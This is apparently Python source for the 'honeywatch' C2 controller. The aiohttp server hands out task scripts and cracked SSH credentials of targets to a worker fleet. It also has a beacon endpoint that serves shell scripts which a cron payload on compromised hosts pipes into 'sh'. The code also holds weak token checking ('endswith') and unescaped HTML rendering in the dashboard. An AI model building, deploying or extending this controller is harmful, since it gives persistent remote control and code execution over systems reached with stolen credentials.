"""C2 controller / dashboard server for honeywatch.

Serves:
- a WebSocket-enabled HTML dashboard at ``/``
- REST endpoints for operations and tasks under ``/api/``
- a WebSocket endpoint at ``/ws`` for live dashboard + worker comms

Requires the optional ``aiohttp`` package (``pip install honeywatch[c2]``).
"""

from __future__ import annotations

import asyncio
import hmac
import json
import ssl
import uuid
from datetime import datetime, timezone
from typing import Any

from honeywatch.c2.store import C2Store
from honeywatch.c2.tls import build_ssl_context
from honeywatch.models import Target, WorkerTask

# aiohttp is an optional dependency for the C2 web plane.
try:
    import aiohttp
    from aiohttp import web

    HAS_AIOHTTP = True
except Exception:  # pragma: no cover - dependency optional
    aiohttp = None  # type: ignore[assignment]
    web = None  # type: ignore[assignment]
    HAS_AIOHTTP = False


def _now() -> str:
    return datetime.now(timezone.utc).isoformat()


def _json_response(data: Any, status: int = 200) -> "web.Response":
    if web is None:  # pragma: no cover
        raise RuntimeError("aiohttp is not installed")
    return web.json_response(data, status=status)


def _query_limit(request: "web.Request", default: int, cap: int) -> int:
    """Parse an optional ``?limit`` query param safely.

    Non-numeric or out-of-range values fall back to ``default`` (instead of
    raising an uncaught ValueError -> HTTP 500), and the result is capped at
    ``cap`` so a caller can't request an unbounded row scan.
    """
    raw = request.query.get("limit")
    if raw is None or raw == "":
        return default
    try:
        val = int(raw)
    except (TypeError, ValueError):
        return default
    if val < 1:
        return default
    return min(val, cap)


_DASHBOARD_HTML = """
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>honeywatch C2</title>
<style>
:root{--bg:#0b0c10;--panel:#1f2833;--text:#c5c6c7;--accent:#45a29e;--warn:#f7b733;--bad:#fc4445;--good:#55efc4;}
body{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;background:var(--bg);color:var(--text);margin:0;padding:2rem;}
h1{margin:0 0 .5rem;color:var(--accent);}
#status{position:fixed;top:1rem;right:1rem;padding:.4rem .8rem;border-radius:.3rem;background:var(--panel);font-size:.8rem;}
.online{color:var(--good)}.offline{color:var(--bad)}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(320px,1fr));gap:1rem;margin-top:1.5rem;}
.card{background:var(--panel);border-radius:.5rem;padding:1rem;box-shadow:0 4px 12px rgba(0,0,0,.3);}
.card h2{margin:0 0 .6rem;font-size:1rem;color:var(--accent);}
table{width:100%;border-collapse:collapse;font-size:.85rem;}
th,td{text-align:left;padding:.4rem;border-bottom:1px solid #374151;}
th{color:#66fcf1;}
tr:hover{background:rgba(255,255,255,.03);}
.pending{color:var(--warn)}.running{color:#66fcf1}.completed{color:var(--good)}.failed{color:var(--bad)}
pre{white-space:pre-wrap;word-break:break-all;background:#0b0c10;padding:.6rem;border-radius:.3rem;max-height:12rem;overflow:auto;}
</style>
</head>
<body>
<h1>honeywatch C2 dashboard</h1>
<div id="status" class="offline">offline</div>
<div class="grid">
  <div class="card"><h2>workers</h2><div id="workers">waiting…</div></div>
  <div class="card"><h2>operations</h2><div id="operations">waiting…</div></div>
  <div class="card"><h2>tasks</h2><div id="tasks">waiting…</div></div>
  <div class="card"><h2>latest events</h2><pre id="events"></pre></div>
</div>
<script>
const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
const ws = new WebSocket(`${proto}//${location.host}/ws`);
const statusEl = document.getElementById('status');
const eventsEl = document.getElementById('events');
let events = [];
function pushEvent(m){
  events.unshift(`[${new Date().toLocaleTimeString()}] ${m}`);
  if(events.length>40)events.pop();
  eventsEl.textContent = events.join('\\n');
}
ws.onopen = () => { statusEl.textContent='online'; statusEl.className='online'; pushEvent('connected'); ws.send(JSON.stringify({type:'subscribe'})); };
ws.onclose = () => { statusEl.textContent='offline'; statusEl.className='offline'; pushEvent('disconnected'); };
ws.onerror = e => pushEvent('ws error: '+e);
ws.onmessage = ev => {
  const msg = JSON.parse(ev.data);
  pushEvent(msg.type + (msg.id ? ' '+msg.id : ''));
  if(msg.type==='snapshot'){ renderWorkers(msg.workers); renderOps(msg.operations); renderTasks(msg.tasks); }
  if(msg.workers) renderWorkers(msg.workers);
  if(msg.operations) renderOps(msg.operations);
  if(msg.tasks) renderTasks(msg.tasks);
};
function table(headers, rows, cellFn){
  let h = '<tr>'+headers.map(x=>'<th>'+x+'</th>').join('')+'</tr>';
  return '<table>'+h+rows.map(r=>'<tr>'+cellFn(r).map(c=>'<td>'+c+'</td>').join('')+'</tr>').join('')+'</table>';
}
function renderWorkers(list){
  if(!list.length){ document.getElementById('workers').innerHTML='<p>no workers</p>'; return; }
  document.getElementById('workers').innerHTML = table(['id','categories','last_seen'], list,
    w => [w.id, (w.categories||[]).join(', '), w.last_seen || '-']);
}
function renderOps(list){
  if(!list.length){ document.getElementById('operations').innerHTML='<p>no operations</p>'; return; }
  document.getElementById('operations').innerHTML = table(['id','payload','status','targets','updated'], list,
    o => [o.id, o.payload_id, `<span class="${o.status}">${o.status}</span>`, (o.target_ips||[]).length, o.updated_at || '-']);
}
function renderTasks(list){
  if(!list.length){ document.getElementById('tasks').innerHTML='<p>no tasks</p>'; return; }
  document.getElementById('tasks').innerHTML = table(['id','payload','category','target','status','worker'], list,
    t => [t.id, t.payload_id, t.category, t.target ? `${t.target.ip}:${t.target.port}` : '-', `<span class="${t.status}">${t.status}</span>`, t.worker_id || '-']);
}
</script>
</body>
</html>
"""


class Controller:
    """HTTP/WebSocket C2 controller."""

    def __init__(
        self,
        store: C2Store,
        host: str = "0.0.0.0",
        port: int = 8443,
        ssl_context: ssl.SSLContext | None = None,
        api_token: str | None = None,
        ca_path: str | None = None,
        revoked_serials: "set[int] | None" = None,
        c2_encrypt: bool = False,
        c2_key: str | None = None,
    ):
        if not HAS_AIOHTTP:
            raise RuntimeError(
                "C2 controller requires aiohttp. Install: pip install honeywatch[c2]"
            )
        self.store = store
        self.host = host
        self.port = port
        self.ssl = ssl_context
        self.api_token = api_token
        self.ca_path = ca_path
        self.mtls_active = ca_path is not None
        self.revoked_serials: set[int] = set(revoked_serials or [])
        self.c2_encrypt = c2_encrypt
        self.crypto: Any = None
        if c2_encrypt:
            from honeywatch.c2.crypto import C2Crypto
            if c2_key:
                import base64
                try:
                    privkey = base64.b64decode(c2_key)
                    self.crypto = C2Crypto(private_key=privkey)
                except Exception:
                    self.crypto = C2Crypto(passphrase=c2_key)
            else:
                self.crypto = C2Crypto()
        self.app = web.Application(middlewares=[self._build_auth_middleware()])
        self._clients: list["web.WebSocketResponse"] = []
        self._setup_routes()

    # ------------------------------------------------------------------ #
    # Auth middleware
    # ------------------------------------------------------------------ #
    def _build_auth_middleware(self):
        """Return a new-style aiohttp middleware enforcing auth.

        Two opt-in gates, composable:
          * mTLS revocation (when ``ca_path`` is set): a request that presents no
            client cert, or presents one whose serial is revoked, is 403. (A
            missing/invalid cert normally fails the TLS handshake before
            reaching here when CERT_REQUIRED is set; this is the app-layer
            backstop for revocation.)
          * Bearer token (when ``api_token`` is set): 401 without it.

        When neither is configured the middleware is a passthrough, preserving
        the historical lab-only behaviour and the test harness.
        """
        token = self.api_token
        mtls = self.mtls_active

        @web.middleware
        async def _auth(request: "web.Request", handler):
            if mtls and not self._mtls_ok(request):
                return web.json_response(
                    {"error": "forbidden: client certificate missing or revoked"},
                    status=403,
                )
            if token and not self._authorized(request):
                return web.json_response({"error": "unauthorized"}, status=401)
            return await handler(request)

        return _auth

    def _client_cert_serial(self, request: "web.Request") -> int | None:
        """Extract the presented client cert's serial, or None if unavailable.

        aiohttp's transport exposes the peer cert via ``get_extra_info("peercert")``
        (the asyncio SSL transport forwards the underlying socket's
        ``getpeercert()`` dict). Python's ``getpeercert()`` returns ``serialNumber``
        as an uppercase hex string with no separators (e.g. ``'2ED0594A...'``),
        so we parse it to an int for set membership/revocation comparison. This
        matches the hex format ``ca.cert_serial`` produces from
        ``openssl x509 -serial``. Never raises.
        """
        try:
            cert = request.transport.get_extra_info("peercert")
        except Exception:
            return None
        if not isinstance(cert, dict):
            return None
        serial = cert.get("serialNumber")
        if serial is None:
            return None
        if isinstance(serial, int):  # defensive; stdlib gives a hex str
            return serial
        try:
            return int(str(serial), 16)
        except (TypeError, ValueError):
            return None

    def _mtls_ok(self, request: "web.Request") -> bool:
        """True when mTLS is active and the presented client cert is not revoked.

        Returns True (passthrough) when mTLS is not configured.
        """
        if not self.mtls_active:
            return True
        serial = self._client_cert_serial(request)
        if serial is None:
            return False
        return serial not in self.revoked_serials

    def revoke_serial(self, serial: int) -> None:
        """Revoke a worker client certificate by its serial number."""
        self.revoked_serials.add(int(serial))

    def is_revoked(self, serial: int) -> bool:
        """True when the serial has been revoked."""
        return int(serial) in self.revoked_serials

    def _authorized(self, request: "web.Request") -> bool:
        """True when the request carries the configured bearer token.

        Accepts either an ``Authorization: Bearer <token>`` header or a
        ``?token=<token>`` query parameter (handy for WebSocket handshakes,
        which can't set headers everywhere). Comparison is constant-time via
        :func:`hmac.compare_digest` to avoid token-recovery timing oracles.
        """
        token = self.api_token
        if not token:
            return True
        auth = request.headers.get("Authorization", "")
        if auth.startswith("Bearer "):
            presented = auth[len("Bearer "):].strip()
            if hmac.compare_digest(presented, token):
                return True
        qtoken = request.query.get("token")
        if qtoken is not None and hmac.compare_digest(qtoken, token):
            return True
        return False

    def _setup_routes(self) -> None:
        self.app.router.add_get("/", self._dashboard)
        self.app.router.add_get("/ws", self._websocket)
        self.app.router.add_get("/api/workers", self._api_workers)
        self.app.router.add_get("/api/operations", self._api_operations)
        self.app.router.add_post("/api/operations", self._api_create_operation)
        self.app.router.add_get("/api/tasks", self._api_tasks)
        self.app.router.add_post("/api/tasks/claim", self._api_claim_task)
        self.app.router.add_post("/api/tasks/{task_id}/result", self._api_task_result)
        self.app.router.add_get("/api/pubkey", self._api_pubkey)
        self.app.router.add_get("/api/beacon", self._api_beacon)
        self.app.router.add_get("/api/health", self._api_health)

    # ------------------------------------------------------------------ #
    # HTTP handlers
    # ------------------------------------------------------------------ #
    async def _dashboard(self, request: "web.Request") -> "web.Response":
        return web.Response(text=_DASHBOARD_HTML, content_type="text/html")

    async def _api_pubkey(self, request: "web.Request") -> "web.Response":
        """Return the controller's public key for C2 encryption.

        Workers fetch this key on first connect and use it to encrypt
        task results. When encryption is disabled, returns 404.
        """
        if not self.c2_encrypt or self.crypto is None:
            return _json_response({"error": "encryption not enabled"}, status=404)
        from honeywatch.c2.crypto import pubkey_b64
        return _json_response({
            "public_key": pubkey_b64(self.crypto.public_key),
            "algorithm": "nacl-sealed-box" if self.crypto.use_nacl else "aes-256-gcm",
        })

    async def _api_beacon(self, request: "web.Request") -> "web.Response":
        """Cron-based beacon endpoint for out-of-band callback.

        Returns a shell script (task) as text/plain when there is pending
        work for the beaconing host, or 204 No Content when idle. The
        cron_beacon payload pipes this output into ``sh`` for execution.

        Query parameters:
            host: hostname of the beaconing host (for logging/matching)
            ip: egress IP of the beaconing host (for task matching)
        """
        if self.api_token:
            auth = request.headers.get("Authorization", "")
            if not auth.endswith(self.api_token):
                return _json_response({"error": "unauthorized"}, status=401)
        host = request.query.get("host", "")
        ip = request.query.get("ip", "")
        # Look for pending tasks that match the beaconing host's IP.
        tasks = await asyncio.to_thread(self.store.query_tasks, status="pending")
        for task in tasks:
            target_ip = task.get("target", {}).get("ip", "") if isinstance(task.get("target"), dict) else ""
            if target_ip and target_ip == ip:
                script = task.get("script", "")
                if script:
                    return web.Response(text=script, content_type="text/plain")
        return web.Response(status=204)

    async def _api_health(self, request: "web.Request") -> "web.Response":
        return _json_response({"status": "ok", "time": _now()})

    async def _api_workers(self, request: "web.Request") -> "web.Response":
        # Surface liveness: workers whose last_seen is older than 3x the
        # typical poll interval are marked offline so the dashboard stops
        # showing ghosts (list_workers has the filter; the API never used it).
        stale = 900.0  # 15 min — ~3x the default 5s poll, generous for slow exec
        workers = await asyncio.to_thread(self.store.list_workers, stale)
        return _json_response({"workers": workers})

    async def _api_operations(self, request: "web.Request") -> "web.Response":
        status = request.query.get("status")
        limit = _query_limit(request, 100, 1000)
        ops = await asyncio.to_thread(self.store.list_operations, status, limit)
        return _json_response({"operations": [_op_dict(o) for o in ops]})

    async def _api_create_operation(self, request: "web.Request") -> "web.Response":
        try:
            data = await request.json()
        except Exception:
            return _json_response({"error": "invalid JSON"}, status=400)
        payload_id = data.get("payload_id")
        target_ips = data.get("target_ips", [])
        manifest = data.get("manifest", {})
        if not payload_id or not target_ips:
            return _json_response(
                {"error": "payload_id and target_ips are required"}, status=400
            )
        op = await asyncio.to_thread(
            self.store.create_operation, payload_id, target_ips, manifest
        )
        await self._broadcast({"type": "operation_created", "id": op.id})
        return _json_response(_op_dict(op), status=201)

    async def _api_tasks(self, request: "web.Request") -> "web.Response":
        operation_id = request.query.get("operation_id")
        status = request.query.get("status")
        worker_id = request.query.get("worker_id")
        limit = _query_limit(request, 500, 5000)
        # Credentials are stripped from the public task view unless an
        # authenticated caller explicitly opts in via ?include_credentials=true.
        include_credentials = (
            bool(self.api_token)
            and request.query.get("include_credentials") == "true"
        )
        tasks = await asyncio.to_thread(
            self.store.list_tasks, operation_id, status, worker_id, limit
        )
        return _json_response(
            {"tasks": [_task_dict(t, include_credentials) for t in tasks]}
        )

    async def _api_claim_task(self, request: "web.Request") -> "web.Response":
        try:
            data = await request.json()
        except Exception:
            data = {}
        worker_id = data.get("worker_id") or f"worker-{uuid.uuid4().hex[:8]}"
        categories = data.get("categories", [])
        await asyncio.to_thread(self.store.register_worker, worker_id, categories)
        task = await asyncio.to_thread(
            self.store.claim_next_task, worker_id, categories
        )
        if task is None:
            return web.Response(status=204)
        await self._broadcast(
            {"type": "task_claimed", "id": task.id, "worker_id": worker_id}
        )
        # The worker executing the task needs the target's ssh credentials,
        # so the claim response includes them (the worker is the authorized
        # actor). Dashboard *listings* strip them -- see _api_tasks/_push_snapshot.
        task_dict = _task_dict(task, include_credentials=True)
        # When C2 encryption is enabled, encrypt the script and variables
        # before sending them over the wire. The marker_map stays plaintext
        # so the controller can deobfuscate worker output without decrypting.
        if self.c2_encrypt and self.crypto is not None:
            from honeywatch.c2.crypto import encrypt_task
            encrypted = encrypt_task(task_dict, self.crypto)
            return _json_response({"task": encrypted})
        return _json_response({"task": task_dict})

    async def _api_task_result(self, request: "web.Request") -> "web.Response":
        task_id = request.match_info["task_id"]
        try:
            data = await request.json()
        except Exception:
            return _json_response({"error": "invalid JSON"}, status=400)
        # When C2 encryption is enabled and the worker sent an encrypted
        # result, decrypt it before storing in the database.
        if self.c2_encrypt and self.crypto is not None and "encrypted_result" in data:
            from honeywatch.c2.crypto import decrypt_result
            decrypted = decrypt_result(data, self.crypto)
            worker_id = decrypted.get("worker_id", "")
            success = bool(decrypted.get("success"))
            result = decrypted.get("result", {})
        else:
            worker_id = data.get("worker_id", "")
            success = bool(data.get("success"))
            result = data.get("result", {})
        completed = await asyncio.to_thread(
            self.store.complete_task, task_id, worker_id, success, result
        )
        # Only broadcast a completion when the store actually transitioned the
        # task (owned by this worker and still running). Otherwise the dashboard
        # would surface a false "task_completed" for a rejected/already-done task.
        if completed:
            await self._broadcast(
                {
                    "type": "task_completed",
                    "id": task_id,
                    "success": success,
                    "worker_id": worker_id,
                }
            )
        return _json_response({"ok": True, "completed": completed})

    # ------------------------------------------------------------------ #
    # WebSocket handlers
    # ------------------------------------------------------------------ #
    async def _websocket(self, request: "web.Request") -> "web.WebSocketResponse":
        if self.api_token and not self._authorized(request):
            return web.json_response({"error": "unauthorized"}, status=401)
        ws = web.WebSocketResponse(heartbeat=30.0)
        await ws.prepare(request)
        self._clients.append(ws)
        try:
            # Send a full snapshot on connect.
            await self._push_snapshot(ws)
            async for msg in ws:
                if msg.type == aiohttp.WSMsgType.TEXT:
                    try:
                        payload = json.loads(msg.data)
                    except ValueError:
                        continue
                    msg_type = payload.get("type")
                    if msg_type == "ping":
                        await ws.send_json({"type": "pong", "time": _now()})
                    elif msg_type == "register_worker":
                        worker_id = payload.get("worker_id")
                        categories = payload.get("categories", [])
                        if worker_id:
                            await asyncio.to_thread(
                                self.store.register_worker, worker_id, categories
                            )
                    elif msg_type == "task_result":
                        # Workers in pure-WS mode report results here instead of
                        # POST /api/tasks/{id}/result. Without this branch the
                        # controller silently dropped every WS-mode task result
                        # and the task stayed "running" forever.
                        task_id = payload.get("task_id", "")
                        w_id = payload.get("worker_id", "")
                        succ = bool(payload.get("success"))
                        res = payload.get("result", {}) or {}
                        completed = await asyncio.to_thread(
                            self.store.complete_task, task_id, w_id, succ, res
                        )
                        if completed:
                            await self._broadcast(
                                {
                                    "type": "task_completed",
                                    "id": task_id,
                                    "success": succ,
                                    "worker_id": w_id,
                                }
                            )
                elif msg.type in (aiohttp.WSMsgType.CLOSED, aiohttp.WSMsgType.ERROR):
                    break
        finally:
            try:
                self._clients.remove(ws)
            except ValueError:
                pass
        return ws

    async def _push_snapshot(self, ws: "web.WebSocketResponse") -> None:
        workers, ops, tasks = await asyncio.gather(
            asyncio.to_thread(self.store.list_workers),
            asyncio.to_thread(self.store.list_operations, None, 100),
            asyncio.to_thread(self.store.list_tasks, None, None, None, 200),
        )
        await ws.send_json(
            {
                "type": "snapshot",
                "workers": workers,
                "operations": [_op_dict(o) for o in ops],
                "tasks": [_task_dict(t) for t in tasks],
            }
        )

    async def _broadcast(self, message: dict[str, Any]) -> None:
        dead: list["web.WebSocketResponse"] = []
        for ws in list(self._clients):
            try:
                await ws.send_json(message)
            except Exception:
                dead.append(ws)
        for ws in dead:
            try:
                self._clients.remove(ws)
            except ValueError:
                pass

    # ------------------------------------------------------------------ #
    # Runner
    # ------------------------------------------------------------------ #
    async def run(self) -> None:
        runner = web.AppRunner(self.app)
        await runner.setup()
        site = web.TCPSite(runner, self.host, self.port, ssl_context=self.ssl)
        await site.start()
        scheme = "https" if self.ssl else "http"
        print(f"honeywatch C2 listening on {scheme}://{self.host}:{self.port}")
        try:
            # Periodic lease sweeper: re-queue tasks whose worker died
            # mid-execution (claimed_at older than the lease window) so the
            # fleet never accumulates orphaned "running" tasks that stall
            # forever. This is the silent-failure fix for worker crashes at
            # scale — without it a 100-worker fleet losing 10%/day stalls on
            # ~10 tasks/day forever.
            sweep_interval = 300.0
            lease_seconds = 3600.0
            while True:
                await asyncio.sleep(sweep_interval)
                try:
                    requeued = await asyncio.to_thread(
                        self.store.sweep_expired_leases, lease_seconds
                    )
                    if requeued:
                        print(
                            f"honeywatch C2: swept {requeued} expired task lease(s) "
                            "back to pending",
                            flush=True,
                        )
                except Exception as exc:
                    print(
                        f"honeywatch C2: lease sweep failed: {type(exc).__name__}: {exc}",
                        flush=True,
                    )
        except asyncio.CancelledError:
            pass
        finally:
            await runner.cleanup()


def _op_dict(op: Any) -> dict[str, Any]:
    return {
        "id": op.id,
        "payload_id": op.payload_id,
        "target_ips": op.target_ips,
        "status": op.status,
        "manifest": op.manifest,
        "result_log": op.result_log,
        "created_at": op.created_at,
        "updated_at": op.updated_at,
    }


def _task_dict(task: WorkerTask, include_credentials: bool = False) -> dict[str, Any]:
    return {
        "id": task.id,
        "operation_id": task.operation_id,
        "payload_id": task.payload_id,
        "category": task.category,
        "target": _target_to_dict(task.target, include_credentials),
        "script": task.script,
        "variables": task.variables,
        "status": task.status,
        "worker_id": task.worker_id,
        "result": task.result,
    }


def _target_to_dict(
    target: Target | None, include_credentials: bool = False
) -> dict[str, Any] | None:
    if target is None:
        return None
    d: dict[str, Any] = {
        "ip": target.ip,
        "port": target.port,
        "label": target.label,
        "confidence": target.confidence,
        "profile_key": target.profile_key,
        "allowed_categories": target.allowed_categories,
    }
    # Cracked ssh credentials are only included for the worker that will exec
    # the task (claim endpoint) or an authenticated caller that explicitly opts
    # in. Dashboard listings and WS snapshots receive the stripped form so a
    # browser session never sees plaintext passwords/keys.
    if include_credentials:
        d["ssh_user"] = target.ssh_user
        d["ssh_key"] = target.ssh_key
        d["ssh_pass"] = target.ssh_pass
    return d


